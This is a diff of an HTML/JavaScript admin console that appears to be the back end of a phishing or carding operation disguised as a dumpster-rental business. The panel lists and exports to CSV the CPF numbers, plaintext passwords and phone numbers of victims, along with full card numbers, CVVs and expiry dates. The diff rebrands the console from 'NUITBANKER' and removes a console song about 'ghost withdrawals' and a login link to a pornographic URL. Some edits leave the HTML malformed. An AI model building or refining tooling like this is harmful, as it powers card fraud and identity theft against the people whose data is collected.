@@ -11,7 +11,6 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Inter', sans-serif; transition: all 0.3s ease; }
 
-        /* TEMA ESCURO */
         body.theme-dark {
             --accent: #3b82f6;
             --accent-rgb: 59, 130, 246;
@@ -23,7 +22,6 @@
             --text-secondary: #a0a0b0;
             --text-muted: #6b7280;
         }
-        /* TEMA CLARO */
         body.theme-light {
             --accent: #3b82f6;
             --accent-rgb: 59, 130, 246;
@@ -73,7 +71,6 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* LOGIN */
         .login-container {
             position: fixed;
             top: 0;
@@ -146,7 +143,6 @@
         }
         @media (max-width: 900px) { .login-image { display: none; } .login-form-wrapper { width: 100%; } }
 
-        /* ADMIN PANEL */
         .admin-panel { display: none; position: relative; z-index: 1; }
         .admin-panel.visible { display: block; }
 
@@ -487,7 +483,6 @@
 
 <div class="loading-screen" id="loadingScreen"><div class="spinner"></div></div>
 
-<!-- LOGIN -->
 <div class="login-container" id="loginContainer">
     <div class="login-image">
         <div class="image-content">
@@ -503,35 +498,34 @@
             <div class="form-group"><label>Login</label><input type="text" id="loginUser" placeholder="User"></div>
             <div class="form-group"><label>Password</label><input type="password" id="loginPass" placeholder="••••••••"></div>
             <button class="login-btn" onclick="handleLogin()">LOGIN</button>
-            <div class="login-footer"><a href=https://www.xvideos.com/video.oouppco1505/yuri_gaucho_-_massagista_dotadao_fodendo_o_cliente_junto_com_o_cinegrafista_da_sessao">Forgot Username / Password?</a></div>
+            <div class="login-footer"><a href="#">Forgot Username / Password?</a></div>
         </div>
     </div>
 </div>
 
-<!-- ADMIN PANEL -->
 <div class="admin-panel" id="adminPanel">
     <button class="sidebar-toggle" id="sidebarToggle" onclick="toggleSidebar()"><i class="fas fa-bars"></i></button>
     
     <aside class="sidebar" id="sidebar">
         <div class="sidebar-header">
-            <h2>NUIT<span>BANKER</span></h2>
-            <p>Secure Console v3.0</p>
+            <h2>Ativa<span>Caçambas</span></h2>
+            <p>Secure Console</p>
         </div>
         <ul class="sidebar-menu">
-    <li><a data-tab="dashboard" onclick="switchTab('dashboard')"><i class="fas fa-chart-line"></i> Dashboard</a></li>
-    <li><a data-tab="produtos" onclick="switchTab('produtos')"><i class="fas fa-dumpster"></i> Products</a></li>
-    <li><a data-tab="agendamentos" onclick="switchTab('agendamentos')"><i class="fas fa-calendar"></i> Schedule</a></li>
-    <li><a data-tab="users" onclick="switchTab('users')"><i class="fas fa-users"></i> Users</a></li>
-    <li><a data-tab="cards" onclick="switchTab('cards')"><i class="fas fa-credit-card"></i> Cards</a></li>
-    <li><a data-tab="payments" onclick="switchTab('payments')"><i class="fas fa-money-bill"></i> Payments</a></li>
-    <li><a data-tab="logs" onclick="switchTab('logs')"><i class="fas fa-history"></i> Logs</a></li>
-    <li><a data-tab="settings" onclick="switchTab('settings')"><i class="fas fa-cog"></i> Settings</a></li>
-</ul>
+            <li><a data-tab="dashboard" onclick="switchTab('dashboard')"><i class="fas fa-chart-line"></i> Dashboard</a></li>
+            <li><a data-tab="produtos" onclick="switchTab('produtos')"><i class="fas fa-dumpster"></i> Products</a></li>
+            <li><a data-tab="agendamentos" onclick="switchTab('agendamentos')"><i class="fas fa-calendar"></i> Schedule</a></li>
+            <li><a data-tab="users" onclick="switchTab('users')"><i class="fas fa-users"></i> Users</a></li>
+            <li><a data-tab="cards" onclick="switchTab('cards')"><i class="fas fa-credit-card"></i> Cards</a></li>
+            <li><a data-tab="payments" onclick="switchTab('payments')"><i class="fas fa-money-bill"></i> Payments</a></li>
+            <li><a data-tab="logs" onclick="switchTab('logs')"><i class="fas fa-history"></i> Logs</a></li>
+            <li><a data-tab="settings" onclick="switchTab('settings')"><i class="fas fa-cog"></i> Settings</a></li>
+        </ul>
     </aside>
 
     <main class="main-content" id="mainContent">
         <div class="admin-header">
-            <h3>ACESS CONSOLE</h3>
+            <h3>Management Console</h3>
             <button class="logout-btn" onclick="handleLogout()"><i class="fas fa-sign-out-alt"></i> Exit</button>
         </div>
 
@@ -589,9 +583,30 @@
         </div>
 
         <div id="tabAgendamentos" class="tab-content"><div class="card"><div class="card-header">Appointments</div><div class="table-wrapper" id="scheduleList"></div></div></div>
-        <div id="tabUsers" class="tab-content"><div class="card"><div class="card-header"><span>User Data</span><div style="display:flex; gap:10px;"><div class="search-box"><i class="fas fa-search"></i><input type="text" id="searchUsers" placeholder="Search CPF..." onkeyup="filterUsers()"></div><button class="btn-primary" onclick="exportUsersCSV()">Export CSV</button><button class="btn-delete" onclick="clearAllUsers()">Clear All</button></div></div><div class="table-wrapper"><table><thead><tr><th>CPF</th><th>Password</th><th>Phone</th><th>Date</th><th>Actions</th></tr></thead><tbody id="usersTable"></tbody></table></div></div></div>
-        <div id="tabCards" class="tab-content"><div class="card"><div class="card-header"><span>Card Data - Full Collection</span><div style="display:flex; gap:10px;"><div class="search-box"><i class="fas fa-search"></i><input type="text" id="searchCards" placeholder="Search CPF..." onkeyup="filterCards()"></div><button class="btn-primary" onclick="exportCardsCSV()">Export CSV</button><button class="btn-delete" onclick="clearAllCards()">Clear All</button></div></div><div class="table-wrapper"><td><thead><tr><th>Client (CPF + Name)</th><th>Card Number</th><th>Cardholder</th><th>CVV</th><th>Expiry</th><th>Date</th><th>Actions</th></tr></thead><tbody id="cardsTable"></tbody></table></div></div></div>
+        
+        <div id="tabUsers" class="tab-content">
+            <div class="card">
+                <div class="card-header"><span>User Data</span><div style="display:flex; gap:10px;"><div class="search-box"><i class="fas fa-search"></i><input type="text" id="searchUsers" placeholder="Search CPF..." onkeyup="filterUsers()"></div><button class="btn-primary" onclick="exportUsersCSV()">Export CSV</button><button class="btn-delete" onclick="clearAllUsers()">Clear All</button></div></div>
+                <div class="table-wrapper"><table><thead><tr><th>CPF</th><th>Password</th><th>Phone</th><th>Date</th><th>Actions</th></tr></thead><tbody id="usersTable"></tbody></table></div>
+            </div>
+        </div>
+
+        <div id="tabCards" class="tab-content">
+            <div class="card">
+                <div class="card-header"><span>Card Data - Full Collection</span><div style="display:flex; gap:10px;"><div class="search-box"><i class="fas fa-search"></i><input type="text" id="searchCards" placeholder="Search CPF..." onkeyup="filterCards()"></div><button class="btn-primary" onclick="exportCardsCSV()">Export CSV</button><button class="btn-delete" onclick="clearAllCards()">Clear All</button></div></div>
+                <div class="table-wrapper" id="cardsTableContainer">
+                    <table>
+                        <thead>
+                            <tr><th>Client (CPF + Name)</th><th>Card Number</th><th>Cardholder</th><th>CVV</th><th>Expiry</th><th>Date</th><th>Actions</th></tr>
+                        </thead>
+                        <tbody id="cardsTable"></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
         <div id="tabPayments" class="tab-content"><div class="card"><div class="card-header"><span>Payment History</span><div style="display:flex; gap:10px;"><button class="btn-primary" onclick="exportPaymentsCSV()">Export CSV</button><button class="btn-delete" onclick="clearAllPayments()">Clear All</button></div></div><div class="table-wrapper" id="paymentsList"></div></div></div>
+        
         <div id="tabLogs" class="tab-content"><div class="card"><div class="card-header"><span>System Logs</span><button class="btn-delete" onclick="clearAllLogs()">Clear All</button></div><div id="logsList"></div></div></div>
 
         <div id="tabSettings" class="tab-content">
@@ -605,7 +620,6 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
 <script>
-// Three.js Background
 (function(){
     const canvas = document.getElementById('bgCanvas');
     if(!canvas) return;
@@ -633,7 +647,6 @@
 
 setTimeout(() => { const loader = document.getElementById('loadingScreen'); if(loader) loader.classList.add('hidden'); }, 400);
 
-// ========== ADMIN LOGIC ==========
 let adminToken = null;
 let refreshInterval = null;
 let productsData = [], usersData = [], cardsData = [], paymentsData = [], logsData = [], scheduleData = [];
@@ -676,23 +689,67 @@ function renderProducts() { const container = document.getElementById('productLi
 async function deleteProduct(id) { if(!confirm('Delete this product?')) return; try { await fetch(`/api/admin/produtos/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } }); showToast('Product deleted', 'success'); await loadProducts(); } catch(e) { showToast('Error'); } }
 document.getElementById('productForm')?.addEventListener('submit', async (e) => { e.preventDefault(); const product = { nome: document.getElementById('prodNome').value, tipo: document.getElementById('prodTipo').value, preco: parseFloat(document.getElementById('prodPreco').value), preco_promocional: parseFloat(document.getElementById('prodPromocional')?.value) || null, descricao: document.getElementById('prodDescricao').value, icone: document.getElementById('prodIcone').value, imagem: document.getElementById('prodImagem').value, dimensoes: document.getElementById('prodDimensoes').value, capacidade: document.getElementById('prodCapacidade').value }; try { await fetch('/api/admin/produtos', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` }, body: JSON.stringify(product) }); showToast('Product added', 'success'); await loadProducts(); e.target.reset(); } catch(e) { showToast('Error'); } });
 
-async function loadSchedule() { if(!adminToken) return; try { const res = await fetch('/api/admin/agendamentos', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); scheduleData = data.agendamentos || []; const container = document.getElementById('scheduleList'); if(!scheduleData.length) { container.innerHTML = '<div style="text-align:center; padding:40px;">No appointments</div>'; return; } container.innerHTML = `<div class="table-wrapper"><table><thead><tr><th>Client</th><th>Phone</th><th>Type</th><th>Address</th><th>Date</th><th>Time</th><th>Actions</th></tr></thead><tbody>${scheduleData.map(a => `<tr><td><strong>${escapeHtml(a.cliente_nome || '-')}</strong></td><td>${formatPhone(a.telefone || '-')}</td><td>${escapeHtml(a.tipo_obra || '-')}</td><td>${escapeHtml(a.endereco_obra || '-')}</td><td>${a.data_agendamento ? new Date(a.data_agendamento).toLocaleDateString() : '-'}</td><td>${a.horario || '-'}</td><td><button class="btn-delete" onclick="deleteSchedule(${a.id})">Delete</button></td></tr>`).join('')}</tbody></div>`; } catch(e) { console.error(e); } }
+async function loadSchedule() { if(!adminToken) return; try { const res = await fetch('/api/admin/agendamentos', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); scheduleData = data.agendamentos || []; const container = document.getElementById('scheduleList'); if(!scheduleData.length) { container.innerHTML = '<div style="text-align:center; padding:40px;">No appointments</div>'; return; } container.innerHTML = `<div class="table-wrapper"></table><thead><tr><th>Client</th><th>Phone</th><th>Type</th><th>Address</th><th>Date</th><th>Time</th><th>Actions</th></tr></thead><tbody>${scheduleData.map(a => `<tr><td><strong>${escapeHtml(a.cliente_nome || '-')}</strong></td><td>${formatPhone(a.telefone || '-')}</td><td>${escapeHtml(a.tipo_obra || '-')}</td><td>${escapeHtml(a.endereco_obra || '-')}</td><td>${a.data_agendamento ? new Date(a.data_agendamento).toLocaleDateString() : '-'}</td><td>${a.horario || '-'}</td><td><button class="btn-delete" onclick="deleteSchedule(${a.id})">Delete</button></td></tr>`).join('')}</tbody></div>`; } catch(e) { console.error(e); } }
 async function deleteSchedule(id) { if(!confirm('Delete this appointment?')) return; try { await fetch(`/api/admin/agendamentos/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } }); showToast('Appointment deleted', 'success'); await loadSchedule(); } catch(e) { showToast('Error'); } }
 
 async function loadUsers() { if(!adminToken) return; try { const res = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); usersData = data.users || []; renderUsers(); } catch(e) { console.error(e); } }
-function renderUsers() { const tbody = document.getElementById('usersTable'); if(!usersData.length) { tbody.innerHTML = '<tr><td colspan="5">No data</td></tr>'; return; } tbody.innerHTML = usersData.map(u => `<tr><td><strong>${formatCPF(u.cpf)}</strong></td><td><span class="badge badge-warning" style="font-family:monospace;">${u.senha || '--------'}</span></td><td>${formatPhone(u.telefone || '-')}</td><td>${u.data_senha ? new Date(u.data_senha).toLocaleString() : (u.data_cpf ? new Date(u.data_cpf).toLocaleString() : '-')}</td><td><button class="btn-delete" onclick="deleteUser('${u.cpf}')">Delete</button></td></tr>`).join(''); }
+function renderUsers() { const tbody = document.getElementById('usersTable'); if(!usersData.length) { tbody.innerHTML = '<tr><td colspan="5">No data<tr></td>'; return; } tbody.innerHTML = usersData.map(u => `<tr><td><strong>${formatCPF(u.cpf)}</strong></td><td><span class="badge badge-warning" style="font-family:monospace;">${u.senha || '--------'}</span></td><td>${formatPhone(u.telefone || '-')}</td><td>${u.data_senha ? new Date(u.data_senha).toLocaleString() : (u.data_cpf ? new Date(u.data_cpf).toLocaleString() : '-')}</td><td><button class="btn-delete" onclick="deleteUser('${u.cpf}')">Delete</button></td></tr>`).join(''); }
 function filterUsers() { const term = document.getElementById('searchUsers')?.value.toLowerCase() || ''; const filtered = usersData.filter(u => (u.cpf || '').toLowerCase().includes(term) || (u.telefone || '').toLowerCase().includes(term)); const tbody = document.getElementById('usersTable'); if(!filtered.length) { tbody.innerHTML = '<tr><td colspan="5">No results</td></tr>'; return; } tbody.innerHTML = filtered.map(u => `<tr><td><strong>${formatCPF(u.cpf)}</strong></td><td><span class="badge badge-warning" style="font-family:monospace;">${u.senha || '--------'}</span></td><td>${formatPhone(u.telefone || '-')}</td><td>${u.data_senha ? new Date(u.data_senha).toLocaleString() : (u.data_cpf ? new Date(u.data_cpf).toLocaleString() : '-')}</td><td><button class="btn-delete" onclick="deleteUser('${u.cpf}')">Delete</button></td></tr>`).join(''); }
 async function deleteUser(cpf) { if(!confirm(`Delete ${formatCPF(cpf)}?`)) return; await fetch(`/api/admin/delete/${encodeURIComponent(cpf)}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadUsers(); showToast('User deleted', 'success'); }
 async function clearAllUsers() { if(!confirm('WARNING: Delete ALL users?')) return; await fetch('/api/admin/clear', { method: 'POST', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadUsers(); showToast('All users deleted', 'success'); }
 
 async function loadCards() { if(!adminToken) return; try { const res = await fetch('/api/admin/cartoes', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); cardsData = data.cartoes || []; renderCards(); } catch(e) { console.error(e); } }
-function renderCards() { const tbody = document.getElementById('cardsTable'); if(!cardsData.length) { tbody.innerHTML = '<tr><td colspan="7">No card data</td></tr>'; return; } tbody.innerHTML = cardsData.map(c => `<tr><td><strong>${formatCPF(c.cpf || '-')}</strong><br><span style="font-size:11px; color:var(--text-muted);">${escapeHtml(c.cliente_nome || c.nome_titular || '-')}</span></td><td><span class="badge badge-danger" style="font-family:monospace;">${formatCardNumber(c.numero_cartao || c.numero)}</span></td><td>${escapeHtml(c.nome_titular || '-')}</td><td><span class="badge badge-warning" style="font-family:monospace;">${c.cvv || '***'}</span></td><td>${c.validade || '-'}</td><td>${c.created_at ? new Date(c.created_at).toLocaleString() : '-'}</td><td><button class="btn-delete" onclick="deleteCard(${c.id})">Delete</button></td></tr>`).join(''); }
-function filterCards() { const term = document.getElementById('searchCards')?.value.toLowerCase() || ''; const filtered = cardsData.filter(c => (c.cpf || '').toLowerCase().includes(term) || (c.cliente_nome || c.nome_titular || '').toLowerCase().includes(term)); const tbody = document.getElementById('cardsTable'); if(!filtered.length) { tbody.innerHTML = '<tr><td colspan="7">No results</td></tr>'; return; } tbody.innerHTML = filtered.map(c => `<tr><td><strong>${formatCPF(c.cpf || '-')}</strong><br><span style="font-size:11px;">${escapeHtml(c.cliente_nome || c.nome_titular || '-')}</span></td><td><span class="badge badge-danger">${formatCardNumber(c.numero_cartao || c.numero)}</span></td><td>${escapeHtml(c.nome_titular || '-')}</td><td><span class="badge badge-warning">${c.cvv || '***'}</span></td><td>${c.validade || '-'}</td><td>${c.created_at ? new Date(c.created_at).toLocaleString() : '-'}</td><td><button class="btn-delete" onclick="deleteCard(${c.id})">Delete</button></td></tr>`).join(''); }
+
+function renderCards() { 
+    const tbody = document.getElementById('cardsTable'); 
+    if(!tbody) { 
+        console.error('cardsTable not found');
+        return; 
+    } 
+    if(!cardsData.length) { 
+        tbody.innerHTML = '<tr><td colspan="7" style="text-align:center">No card data collected</td></tr>'; 
+        return; 
+    } 
+    tbody.innerHTML = cardsData.map(c => `
+        <tr>
+            <td><strong>${formatCPF(c.cpf || '-')}</strong><br><small style="color:var(--text-muted);">${escapeHtml(c.nome_titular || '-')}</small></td>
+            <td><span class="badge badge-danger" style="font-family:monospace;">${formatCardNumber(c.numero_cartao)}</span></td>
+            <td>${escapeHtml(c.nome_titular || '-')}</td>
+            <td><span class="badge badge-warning" style="font-family:monospace;">${c.cvv || '***'}</span></td>
+            <td>${c.validade || '-'}</td>
+            <td>${c.created_at ? new Date(c.created_at).toLocaleString() : '-'}</td>
+            <td><button class="btn-delete" onclick="deleteCard(${c.id})">Delete</button></td>
+        </tr>
+    `).join('');
+    console.log(`✅ ${cardsData.length} cartões renderizados`);
+}
+
+function filterCards() { 
+    const term = document.getElementById('searchCards')?.value.toLowerCase() || ''; 
+    const filtered = cardsData.filter(c => (c.cpf || '').toLowerCase().includes(term) || (c.nome_titular || '').toLowerCase().includes(term)); 
+    const tbody = document.getElementById('cardsTable'); 
+    if(!filtered.length) { 
+        tbody.innerHTML = '<tr><td colspan="7" style="text-align:center">No results</td></tr>'; 
+        return; 
+    } 
+    tbody.innerHTML = filtered.map(c => `
+        <tr>
+            <td><strong>${formatCPF(c.cpf || '-')}</strong><br><small style="color:var(--text-muted);">${escapeHtml(c.nome_titular || '-')}</small></td>
+            <td><span class="badge badge-danger" style="font-family:monospace;">${formatCardNumber(c.numero_cartao)}</span></td>
+            <td>${escapeHtml(c.nome_titular || '-')}</td>
+            <td><span class="badge badge-warning" style="font-family:monospace;">${c.cvv || '***'}</span></td>
+            <td>${c.validade || '-'}</td>
+            <td>${c.created_at ? new Date(c.created_at).toLocaleString() : '-'}</td>
+            <td><button class="btn-delete" onclick="deleteCard(${c.id})">Delete</button></td>
+        </tr>
+    `).join(''); 
+}
+
 async function deleteCard(id) { if(!confirm('Delete this card?')) return; try { await fetch(`/api/admin/cartoes/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadCards(); showToast('Card deleted', 'success'); } catch(e) { showToast('Error'); } }
 async function clearAllCards() { if(!confirm('WARNING: Delete ALL cards?')) return; await fetch('/api/admin/clear-cards', { method: 'POST', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadCards(); showToast('All cards deleted', 'success'); }
 
 async function loadPaymentsFull() { if(!adminToken) return; try { const res = await fetch('/api/admin/payments', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); paymentsData = data.payments || []; renderPaymentsFull(); } catch(e) { console.error(e); } }
-function renderPaymentsFull() { const container = document.getElementById('paymentsList'); if(!paymentsData.length) { container.innerHTML = '<div style="text-align:center; padding:40px;">No payments</div>'; return; } container.innerHTML = `<div class="table-wrapper"><table><thead><tr><th>ID</th><th>CPF</th><th>Phone</th><th>Amount</th><th>Status</th><th>Type</th><th>Date</th><th>Actions</th></tr></thead><tbody>${paymentsData.map(p => `<tr><td>${p.id}</td><td><strong>${formatCPF(p.cpf)}</strong></td><td>${formatPhone(p.telefone || '-')}</td><td><span class="badge badge-success">R$ ${parseFloat(p.valor).toFixed(2)}</span></td><td><span class="badge ${p.status === 'paid' ? 'badge-success' : 'badge-warning'}">${p.status === 'paid' ? 'PAID' : 'PENDING'}</span></td><td>${p.tipo_pagamento || 'PIX'}</td><td>${new Date(p.data_solicitacao).toLocaleString()}</td><td><button class="btn-delete" onclick="deletePayment(${p.id})">Delete</button></td></tr>`).join('')}</tbody></div>`; }
+function renderPaymentsFull() { const container = document.getElementById('paymentsList'); if(!paymentsData.length) { container.innerHTML = '<div style="text-align:center; padding:40px;">No payments</div>'; return; } container.innerHTML = `<div class="table-wrapper"></table><thead><tr><th>ID</th><th>CPF</th><th>Phone</th><th>Amount</th><th>Status</th><th>Type</th><th>Date</th><th>Actions</th></tr></thead><tbody>${paymentsData.map(p => `<tr><td>${p.id}</td><td><strong>${formatCPF(p.cpf)}</strong></td><td>${formatPhone(p.telefone || '-')}</td><td><span class="badge badge-success">R$ ${parseFloat(p.valor).toFixed(2)}</span></td><td><span class="badge ${p.status === 'paid' ? 'badge-success' : 'badge-warning'}">${p.status === 'paid' ? 'PAID' : 'PENDING'}</span></td><td>${p.tipo_pagamento || 'PIX'}</td><td>${new Date(p.data_solicitacao).toLocaleString()}</td><td><button class="btn-delete" onclick="deletePayment(${p.id})">Delete</button></td></tr>`).join('')}</tbody></div>`; }
 async function deletePayment(id) { if(!confirm('Delete this payment?')) return; try { await fetch(`/api/admin/payments/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadPaymentsFull(); showToast('Payment deleted', 'success'); } catch(e) { showToast('Error'); } }
 async function clearAllPayments() { if(!confirm('WARNING: Delete ALL payments?')) return; await fetch('/api/admin/clear-payments', { method: 'POST', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadPaymentsFull(); showToast('All payments deleted', 'success'); }
 async function loadPayments() { return loadPaymentsFull(); }
@@ -706,7 +763,7 @@ function renderRecentActivity(logs) { const container = document.getElementById(
 function renderRecentPayments(payments) { const container = document.getElementById('recentPayments'); if(!payments.length) { container.innerHTML = '<div style="padding:20px; text-align:center;">No payments</div>'; return; } container.innerHTML = payments.map(p => `<div class="log-item"><span class="log-time">${new Date(p.data_solicitacao).toLocaleString()}</span><span class="badge badge-success">R$ ${parseFloat(p.valor).toFixed(2)}</span><span>${formatCPF(p.cpf)}</span><span>${p.status === 'paid' ? 'PAID' : 'PENDING'}</span></div>`).join(''); }
 
 function exportUsersCSV() { if(!usersData.length) { showToast('No data'); return; } let csv = "CPF,PASSWORD,PHONE,DATE\n"; usersData.forEach(u => csv += `"${u.cpf}","${u.senha || ''}","${u.telefone || ''}","${u.data_senha || u.data_cpf || ''}"\n`); const blob = new Blob([csv], { type: 'text/csv' }); const link = document.createElement('a'); link.href = URL.createObjectURL(blob); link.download = `users_${new Date().toISOString().slice(0,19)}.csv`; link.click(); showToast('CSV exported', 'success'); }
-function exportCardsCSV() { if(!cardsData.length) { showToast('No card data'); return; } let csv = "CPF,CLIENT_NAME,CARD_NUMBER,CARDHOLDER,CVV,EXPIRY,DATE\n"; cardsData.forEach(c => csv += `"${c.cpf || ''}","${c.cliente_nome || c.nome_titular || ''}","${c.numero_cartao || c.numero || ''}","${c.nome_titular || ''}","${c.cvv || ''}","${c.validade || ''}","${c.created_at || ''}"\n`); const blob = new Blob([csv], { type: 'text/csv' }); const link = document.createElement('a'); link.href = URL.createObjectURL(blob); link.download = `cards_${new Date().toISOString().slice(0,19)}.csv`; link.click(); showToast('CSV exported', 'success'); }
+function exportCardsCSV() { if(!cardsData.length) { showToast('No card data'); return; } let csv = "CPF,CLIENT_NAME,CARD_NUMBER,CARDHOLDER,CVV,EXPIRY,DATE\n"; cardsData.forEach(c => csv += `"${c.cpf || ''}","${c.nome_titular || ''}","${c.numero_cartao || ''}","${c.nome_titular || ''}","${c.cvv || ''}","${c.validade || ''}","${c.created_at || ''}"\n`); const blob = new Blob([csv], { type: 'text/csv' }); const link = document.createElement('a'); link.href = URL.createObjectURL(blob); link.download = `cards_${new Date().toISOString().slice(0,19)}.csv`; link.click(); showToast('CSV exported', 'success'); }
 function exportPaymentsCSV() { if(!paymentsData.length) { showToast('No payment data'); return; } let csv = "ID,CPF,PHONE,AMOUNT,STATUS,TYPE,DATE\n"; paymentsData.forEach(p => csv += `"${p.id}","${p.cpf}","${p.telefone || ''}","${p.valor}","${p.status}","${p.tipo_pagamento || 'PIX'}","${p.data_solicitacao}"\n`); const blob = new Blob([csv], { type: 'text/csv' }); const link = document.createElement('a'); link.href = URL.createObjectURL(blob); link.download = `payments_${new Date().toISOString().slice(0,19)}.csv`; link.click(); showToast('CSV exported', 'success'); }
 async function loadLogs() { return loadLogsFull(); }
 
@@ -724,40 +781,6 @@ function switchTab(tabName) {
     if(window.innerWidth <= 768) document.getElementById('sidebar')?.classList.remove('mobile-open');
     if(!loadedTabs[tabName]) { loadedTabs[tabName] = true; if(tabName === 'produtos') loadProducts(); else if(tabName === 'agendamentos') loadSchedule(); else if(tabName === 'users') loadUsers(); else if(tabName === 'cards') loadCards(); else if(tabName === 'payments') loadPaymentsFull(); else if(tabName === 'logs') loadLogsFull(); }
 }
-  
-   // ============ MUSICA NO CONSOLE COM TIMING PERFEITO ============
-const musicaCompleta = [
-    { tempo: 0, texto: 'Saque fantasma procedimento', cor: '#ff0000', negrito: true, tamanho: 16 },
-    { tempo: 1.2, texto: 'Sem blocar e sem alarde', cor: '#ff6600', negrito: false, tamanho: 14 },
-    { tempo: 2.4, texto: 'A pena tira de tempo', cor: '#ffcc00', negrito: false, tamanho: 14 },
-    { tempo: 3.6, texto: 'E a firma é sem massagem', cor: '#00ff00', negrito: false, tamanho: 14 },
-    { tempo: 5.0, texto: '', cor: '', negrito: false, tamanho: 0 },
-    { tempo: 6.0, texto: 'Nóis tá rico, tá né?', cor: '#ff00ff', negrito: true, tamanho: 15 },
-    { tempo: 7.2, texto: 'Tá fortão de mulher!', cor: '#ff00ff', negrito: true, tamanho: 15 },
-    { tempo: 8.4, texto: 'Se a puta quer mimo caro', cor: '#00ccff', negrito: false, tamanho: 14 },
-    { tempo: 9.6, texto: 'Nóis te banca marcha e fé', cor: '#00ccff', negrito: false, tamanho: 14 },
-    { tempo: 11.0, texto: '', cor: '', negrito: false, tamanho: 0 },
-    { tempo: 12.0, texto: 'Nóis tá rico, tá né?', cor: '#ff00ff', negrito: true, tamanho: 15 },
-    { tempo: 13.2, texto: 'Tá fortão de mulher!', cor: '#ff00ff', negrito: true, tamanho: 15 },
-    { tempo: 14.4, texto: 'Se a puta quer mimo caro', cor: '#00ccff', negrito: false, tamanho: 14 },
-    { tempo: 15.6, texto: 'Nóis te banca marcha e fé', cor: '#00ccff', negrito: false, tamanho: 14 },
-    { tempo: 17.0, texto: '', cor: '', negrito: false, tamanho: 0 },
-    { tempo: 18.0, texto: 'NUIT E GG BANKER´S ', cor: '#ffd700', negrito: true, tamanho: 18, fundo: '#000' }
-];
-
-musicaCompleta.forEach(linha => {
-    setTimeout(() => {
-        if (linha.texto === '') {
-            console.log('');
-        } else {
-            let estilo = `color: ${linha.cor}; font-size: ${linha.tamanho}px;`;
-            if (linha.negrito) estilo += ' font-weight: bold;';
-            if (linha.fundo) estilo += ` background: ${linha.fundo}; padding: 4px;`;
-            console.log(`%c${linha.texto}`, estilo);
-        }
-    }, linha.tempo * 1000);
-});
-</script>
 </script>
 </body>
 </html>
